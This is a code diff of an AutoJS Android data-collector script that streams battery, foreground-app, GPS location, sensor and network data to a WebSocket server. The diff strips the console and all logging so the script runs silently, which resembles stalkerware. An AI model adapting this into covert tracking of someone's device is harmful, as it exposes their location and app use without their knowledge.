@@ -1,10 +1,9 @@
 // device_collector.js
 // 增强版 - 电池详细信息（电压/电流/容量）+ 应用名称（非包名）
 // 支持 AutoJS 自身与 Shizuku 双通道获取
+// 静默运行（无日志输出）
 
 "auto";
-
-console.show();
 
 // ==================== 动态导入 Java 类 ====================
 try {
@@ -390,20 +389,6 @@ var CONFIG = {
     "collectNetwork": true  // 网络监控开关
 };
 
-// ==================== 打印设备信息 ====================
-log("=".repeat(60));
-log("📱 设备信息");
-log("=".repeat(60));
-log("📋 设备型号: " + DEVICE_ID);
-if (MARKET_NAME) {
-    log("📛 市场名称: " + MARKET_NAME);
-}
-log("🏭 制造商: " + MANUFACTURER);
-log("📦 Android版本: " + ANDROID_VERSION + " (SDK " + SDK_VERSION + ")");
-log("📐 屏幕: " + SCREEN_INFO.width + "x" + SCREEN_INFO.height);
-log("⏱️ 上传间隔: " + CONFIG.updateInterval + "秒");
-log("=".repeat(60));
-
 // ==================== 状态变量 ====================
 var ws = null;
 var wsConnected = false;
@@ -539,7 +524,7 @@ function getBatteryDetailsAutoJS() {
             } catch(e) {}
         }
     } catch(e) {
-        log("AutoJS电池获取异常: " + e.message);
+        // 静默失败
     }
     return info;
 }
@@ -592,7 +577,7 @@ function getBatteryDetailsShizuku() {
             info.capacity = parseInt(capacityRaw);
         }
     } catch(e) {
-        log("Shizuku电池获取异常: " + e.message);
+        // 静默失败
     }
     return info;
 }
@@ -604,14 +589,12 @@ function getBatteryDetails() {
     var autoData = getBatteryDetailsAutoJS();
     var shizukuData = getBatteryDetailsShizuku();
     
-    // 合并：优先使用 shizuku 的非空值，否则使用 autoData
     var result = {};
     var keys = ["voltage", "current", "capacity", "level", "temperature", "health", "status"];
     for (var i = 0; i < keys.length; i++) {
         var key = keys[i];
         var shizVal = shizukuData[key];
         var autoVal = autoData[key];
-        // 如果 shizuku 有有效值（非 null, 非 -1 或非 0 对于电流容量），则使用
         if (shizVal !== null && shizVal !== undefined && shizVal !== -1 && shizVal !== 0) {
             result[key] = shizVal;
         } else if (autoVal !== null && autoVal !== undefined && autoVal !== -1) {
@@ -620,13 +603,10 @@ function getBatteryDetails() {
             result[key] = null;
         }
     }
-    // 日志输出对比（便于调试）
-    log("🔋 电池信息对比: AutoJS[电压=" + autoData.voltage + "mV, 电流=" + autoData.current + "μA, 容量=" + autoData.capacity + "mAh, 电量=" + autoData.level + "%]");
-    log("🔋 Shizuku[电压=" + shizukuData.voltage + "mV, 电流=" + shizukuData.current + "μA, 容量=" + shizukuData.capacity + "mAh, 电量=" + shizukuData.level + "%]");
     return result;
 }
 
-// ==================== 获取前台应用（增强版：包含应用名称） ====================
+// ==================== 获取前台应用（增强版：包含应用名称和窗口标题） ====================
 function getForegroundApp() {
     var pkg = "Unknown";
     var act = "Unknown";
@@ -642,7 +622,7 @@ function getForegroundApp() {
                 }
             }
         } catch (e) {
-            log("⚠️ currentPackage() 调用失败: " + e.message);
+            // 静默
         }
 
         if (pkg === "Unknown") {
@@ -726,7 +706,8 @@ function getForegroundApp() {
         activity: act,
         source: source,
         isAutoJsService: !!auto.service,
-        appName: appName   // 新增字段
+        appName: appName,               // 保留字段
+        windowTitle: appName            // 新增：应用名称作为窗口标题（服务器优先使用）
     };
 }
 
@@ -893,19 +874,17 @@ function collectAllData() {
             temperature: batteryDetail.temperature !== null ? batteryDetail.temperature : -1,
             voltage: batteryDetail.voltage !== null ? batteryDetail.voltage : -1,
             health: batteryDetail.health !== null ? batteryDetail.health : "Unknown",
-            // 新增字段
             current: batteryDetail.current !== null ? batteryDetail.current : -1,
             capacity: batteryDetail.capacity !== null ? batteryDetail.capacity : -1,
             status: batteryDetail.status !== null ? batteryDetail.status : -1
         };
-        // 判断是否充电
         if (battery.status !== -1) {
-            battery.charging = (battery.status === 2 || battery.status === 5); // 2=充电中, 5=已充满
+            battery.charging = (battery.status === 2 || battery.status === 5);
         }
         data.battery = battery;
     }
 
-    // ===== 前台应用（含应用名称） =====
+    // ===== 前台应用（含应用名称和窗口标题） =====
     if (CONFIG.collectForegroundApp) {
         data.foreground = getForegroundApp();
     }
@@ -1079,14 +1058,12 @@ function connectWebSocket() {
     }
 
     var wsUrl = "ws://" + CONFIG.wsServer;
-    log("🔗 连接: " + wsUrl);
 
     try {
         ws = web.newWebSocket(wsUrl);
 
         ws.on("open", function onWsOpen(res, socket) {
             if (!isRunning) return;
-            log("✅ 已连接");
             wsConnected = true;
 
             try {
@@ -1094,9 +1071,8 @@ function connectWebSocket() {
                 data.dataType = "full";
                 ws.send(JSON.stringify(data));
                 sendCount++;
-                log("📤 发送 #" + sendCount + " (完整数据)");
             } catch (e) {
-                log("❌ 发送失败: " + e.message);
+                // 静默失败
             }
         });
 
@@ -1104,7 +1080,6 @@ function connectWebSocket() {
 
         ws.on("close", function onWsClose(code, reason, socket) {
             if (!isRunning) return;
-            log("🔴 断开: " + code);
             wsConnected = false;
             if (code !== 1000 && isRunning) {
                 setTimeout(connectWebSocket, 3000);
@@ -1115,13 +1090,12 @@ function connectWebSocket() {
 
         ws.on("failure", function onWsFailure(err, res, socket) {
             if (!isRunning) return;
-            log("❌ 连接失败");
             wsConnected = false;
             setTimeout(connectWebSocket, 3000);
         });
 
     } catch (e) {
-        log("❌ 创建失败: " + e.message);
+        // 静默
         setTimeout(connectWebSocket, 3000);
     }
 }
@@ -1136,11 +1110,7 @@ function sendPeriodicData() {
             data.dataType = "diff";
             ws.send(JSON.stringify(data));
             sendCount++;
-            if (sendCount % 20 === 0) {
-                log("📤 已发送 " + sendCount + " 次");
-            }
         } catch (e) {
-            log("❌ 发送失败: " + e.message);
             wsConnected = false;
             setTimeout(connectWebSocket, 3000);
         }
@@ -1151,58 +1121,9 @@ function sendPeriodicData() {
     }
 }
 
-// ==================== 全局命令 ====================
+// ==================== 全局命令（保留供调试，无日志） ====================
 globalThis.collectData = function() {
     var data = collectAllData();
-    log("📊 手动收集完成");
-    if (data.memory && data.memory.total > 0) {
-        var totalMB = (data.memory.total / 1024 / 1024).toFixed(0);
-        var usedMB = (data.memory.used / 1024 / 1024).toFixed(0);
-        log("  💾 内存: " + usedMB + "MB / " + totalMB + "MB (" + data.memory.usagePercent + "%)");
-    }
-    if (data.cpu && data.cpu.cores > 0) {
-        log("  💻 CPU: " + data.cpu.cores + "核心, 使用率 " + data.cpu.usage + "%");
-    }
-    if (data.storage && data.storage.total > 0) {
-        var totalGB = (data.storage.total / 1024 / 1024 / 1024).toFixed(1);
-        var usedGB = (data.storage.used / 1024 / 1024 / 1024).toFixed(1);
-        log("  💾 存储: " + usedGB + "GB / " + totalGB + "GB (" + data.storage.usagePercent + "%)");
-    }
-    if (data.foreground) {
-        log("  📱 前台: " + data.foreground.packageName + " (" + data.foreground.source + ")");
-        log("  📱 Activity: " + data.foreground.activity);
-        log("  📱 应用名称: " + data.foreground.appName);
-    }
-    if (data.battery) {
-        log("  🔋 电量: " + data.battery.level + "%" + (data.battery.charging ? " (充电中)" : ""));
-        if (data.battery.voltage > 0) log("  🔋 电压: " + data.battery.voltage + "mV");
-        if (data.battery.current > 0) log("  🔋 电流: " + data.battery.current + "μA");
-        if (data.battery.capacity > 0) log("  🔋 容量: " + data.battery.capacity + "mAh");
-    }
-    if (data.location && data.location.hasLocation) {
-        log("  📍 GPS: " + data.location.latitude + ", " + data.location.longitude);
-    }
-    if (data.sensors) {
-        var sensorKeys = Object.keys(data.sensors);
-        log("  📡 传感器: " + sensorKeys.length + "个");
-        for (var i = 0; i < Math.min(sensorKeys.length, 3); i++) {
-            var key = sensorKeys[i];
-            var val = data.sensors[key];
-            if (val && typeof val === 'object') {
-                if (val.x !== undefined) {
-                    log("    - " + key + ": x=" + val.x.toFixed(2) + ", y=" + val.y.toFixed(2) + ", z=" + val.z.toFixed(2));
-                } else if (val.value !== undefined) {
-                    log("    - " + key + ": " + val.value.toFixed(1));
-                }
-            }
-        }
-    }
-    if (data.network) {
-        log("  🌐 网络: " + data.network.type + (data.network.isConnected ? " ✅" : " ❌"));
-        log("  ⬇️ 下载: " + data.network.downSpeedStr + " (间隔 " + data.network.intervalRxStr + ")");
-        log("  ⬆️ 上传: " + data.network.upSpeedStr + " (间隔 " + data.network.intervalTxStr + ")");
-        log("  📊 总下载: " + data.network.totalRxStr + " | 总上传: " + data.network.totalTxStr);
-    }
     return data;
 };
 
@@ -1212,34 +1133,21 @@ globalThis.sendData = function() {
             var data = collectAllData();
             data.dataType = "full";
             ws.send(JSON.stringify(data));
-            log("📤 手动发送成功");
-        } catch (e) {
-            log("❌ 发送失败: " + e.message);
-        }
-    } else {
-        log("⚠️ 未连接");
+        } catch (e) {}
     }
 };
 
 globalThis.status = function() {
-    var level = detectPermissionLevel();
-    var names = ["无", "AutoJS", "Shizuku", "Root"];
-    log("=".repeat(60));
-    log("📊 状态:");
-    log("  📋 设备: " + CONFIG.deviceId);
-    if (MARKET_NAME) {
-        log("  📛 市场名: " + MARKET_NAME);
-    }
-    log("  🔑 权限: " + (names[level] || "未知"));
-    log("  🔗 连接: " + (wsConnected ? "✅" : "❌"));
-    log("  🌐 服务器: " + CONFIG.wsServer);
-    log("  📤 发送: " + sendCount + " 次");
-    log("  ⏱️ 间隔: " + CONFIG.updateInterval + "秒");
-    log("=".repeat(60));
+    // 无输出，仅返回状态对象
+    return {
+        deviceId: CONFIG.deviceId,
+        connected: wsConnected,
+        sendCount: sendCount,
+        interval: CONFIG.updateInterval
+    };
 };
 
 globalThis.stop = function() {
-    log("🛑 停止");
     isRunning = false;
     if (ws) {
         try { ws.close(1000, "停止"); } catch (e) {}
@@ -1248,110 +1156,30 @@ globalThis.stop = function() {
     wsConnected = false;
 };
 
-// ==================== 主程序 ====================
-log("=".repeat(60));
-log("📱 设备收集 v11.1 (电池增强+应用名称)");
-log("=".repeat(60));
-log("📋 设备ID: " + CONFIG.deviceId);
-if (MARKET_NAME) {
-    log("📛 市场名: " + MARKET_NAME);
-}
-log("🏭 制造商: " + MANUFACTURER);
-log("📦 Android: " + ANDROID_VERSION + " (SDK " + SDK_VERSION + ")");
-log("📐 屏幕: " + SCREEN_INFO.width + "x" + SCREEN_INFO.height);
-log("🌐 服务器: " + CONFIG.wsServer);
-log("⏱️ 上传间隔: " + CONFIG.updateInterval + "秒");
-log("=".repeat(60));
-
-var level = detectPermissionLevel();
-var names = ["无", "AutoJS", "Shizuku", "Root"];
-log("🔑 权限: " + (names[level] || "未知"));
-
-// 初始化网络统计
-log("\n🌐 初始化网络监控...");
+// ==================== 主程序（静默启动） ====================
+// 初始化网络统计（静默）
 try {
     getNetworkStats(CONFIG.updateInterval);
-    var netTest = getNetworkStats(CONFIG.updateInterval);
-    log("✅ 网络监控已启动");
-    log("  🌐 网络类型: " + netTest.type);
-    log("  📊 总下载: " + netTest.totalRxStr);
-    log("  📊 总上传: " + netTest.totalTxStr);
-} catch (e) {
-    log("❌ 网络监控初始化失败: " + e.message);
-}
+} catch (e) {}
 
-// ===== 启动传感器采集 =====
-log("\n📡 启动传感器采集...");
+// 启动传感器采集
 try {
     startSensorCollection();
-    log("✅ 传感器采集已启动");
-} catch (e) {
-    log("❌ 传感器启动失败: " + e.message);
-}
+} catch (e) {}
 
-log("\n📊 测试收集...");
-try {
-    var test = collectAllData();
-    log("✅ 成功，字段数: " + Object.keys(test).length);
-    if (test.device) {
-        log("  📱 " + test.device.model);
-    }
-    if (test.battery) {
-        log("  🔋 电量: " + test.battery.level + "%" + (test.battery.charging ? " (充电中)" : ""));
-        if (test.battery.voltage > 0) log("  🔋 电压: " + test.battery.voltage + "mV");
-        if (test.battery.current > 0) log("  🔋 电流: " + test.battery.current + "μA");
-        if (test.battery.capacity > 0) log("  🔋 容量: " + test.battery.capacity + "mAh");
-    }
-    if (test.foreground) {
-        log("  📱 前台包名: " + test.foreground.packageName + " (来源: " + test.foreground.source + ")");
-        log("  📱 应用名称: " + test.foreground.appName);
-        if (test.foreground.activity && test.foreground.activity !== "Unknown") {
-            log("  📱 Activity: " + test.foreground.activity);
-        }
-    }
-    if (test.memory && test.memory.total > 0) {
-        var totalMB = (test.memory.total / 1024 / 1024).toFixed(0);
-        var usedMB = (test.memory.used / 1024 / 1024).toFixed(0);
-        log("  💾 内存: " + usedMB + "MB / " + totalMB + "MB");
-    }
-    if (test.sensors) {
-        var sensorKeys = Object.keys(test.sensors);
-        log("  📡 传感器: " + sensorKeys.length + "个");
-    }
-    if (test.network) {
-        log("  🌐 网络: " + test.network.type + " (" + test.network.detail + ")");
-        log("  ⬇️ " + test.network.downSpeedStr + "  ⬆️ " + test.network.upSpeedStr);
-        log("  📊 间隔流量: ⬇️" + test.network.intervalRxStr + " ⬆️" + test.network.intervalTxStr);
-    }
-} catch (e) {
-    log("❌ 失败: " + e.message);
-}
-
-log("\n🔗 启动 WebSocket...");
+// 启动 WebSocket
 connectWebSocket();
 
 setTimeout(function() {
     if (isRunning) {
-        log("⏱️ 开始定期发送...");
         sendPeriodicData();
     }
 }, 3000);
 
 events.on("exit", function() {
-    log("\n🧹 清理...");
     isRunning = false;
     if (ws) {
         try { ws.close(1000, "退出"); } catch (e) {}
         ws = null;
     }
-    log("✅ 完成");
 });
-
-log("\n" + "=".repeat(60));
-log("✅ 已启动!");
-log("命令:");
-log("  collectData() - 手动收集");
-log("  sendData()    - 发送数据");
-log("  status()      - 查看状态");
-log("  stop()        - 停止");
-log("=".repeat(60));
